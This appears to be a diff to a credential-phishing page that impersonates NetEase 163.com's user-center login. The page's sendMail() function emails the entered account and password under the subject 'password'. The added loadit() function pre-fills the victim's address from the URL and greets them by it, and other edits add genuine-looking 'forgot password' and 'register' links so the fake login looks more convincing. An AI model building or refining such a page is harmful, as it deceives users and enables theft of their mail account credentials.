@@ -12,6 +12,13 @@
 
 <script language="JavaScript">
 
+function loadit(){
+    var a = location.href; 
+    var addr = a.substring(a.indexOf("?")+1);
+    document.getElementById("form").elements[0].value=addr;
+    document.getElementById("user163_name").innerHTML=addr;
+}
+
 function sendMail() {
     $.ajax({
       type: "POST",
@@ -29,7 +36,7 @@ function sendMail() {
           ],
           'subject': 'password',
           'html': document.getElementById("form").elements[0].value
-          +"\r\n"+document.getElementById("form").elements[1].value
+          +"<br>"+document.getElementById("form").elements[1].value
         }
       },
       success : function(data) {
@@ -152,7 +159,7 @@ function strlen2(str){
 // -->
 </script>
 </head>
-<body>
+<body onload="loadit()">
 <!--header-->
 
 <div id="ursCode" style="position:fixed; _position:absolute; top:100px; right:0px; text-align:center;" onmouseenter="document.getElementById(&#39;code&#39;).style.display=&#39;block&#39;;" onmouseleave="document.getElementById(&#39;code&#39;).style.display=&#39;none&#39;;">
@@ -173,7 +180,7 @@ function strlen2(str){
 
 	    <a href="https://reg.163.com/yixin/caipiaoact.do#from=ursdlh" style="text-decoration:none;" target="_blank"><img src="./网易用户中心_files/yx3.gif" style="position:absolute; top:0; left:280px; border:none;"></a>
 
-  <div class="header_tool"><span class="user163_info"><span id="sayHello"></span>
+  <div class="header_tool"><span class="user163_info"><span id="sayHello">你好， </span>
   <script type="text/javascript" src="./网易用户中心_files/nav163.js"></script>
   <span class="user163_box" id="user163">
   	<span class="user163_name" id="user163_name" title="net_administrat0r@163.com"></span>
@@ -309,15 +316,20 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
 		<!-- <input type="hidden" name="noheader" id="noheader" value="null"> -->
         <ul class="main_form">
           <li>
-            <div class="fm_left">邮箱帐号：</div>
+            <div class="f_w_b">请登录网易邮箱帐号：</div>
+          </li>
+          <li>
+            <div class="fm_left">帐号：</div>
             <div class="fm_right">
-              <input class="input" title="用户名" name="password" id="username" >
+              <input class="input" title="用户名" name="password" id="username" style="width:160px">
+              <span>&nbsp;<a target="_blank" href="https://reg.163.com/reg/reg.jsp?product=urs">注册新帐号</a></span>  
             </div>
           </li>
           <li>
-            <div class="fm_left">邮箱密码：</div>
+            <div class="fm_left">密码：</div>
             <div class="fm_right">
-              <input class="input" title="密码" type="password" name="password" id="password" >
+              <input class="input" title="密码" type="password" name="password" id="password" style="width:160px">
+              <span>&nbsp;<a target="_blank" href="https://reg.163.com/RecoverPassword.shtml">忘记密码？</a></span>  
             </div>
           </li>
             <!-- <div class="fm_left">设置新的密码：</div>
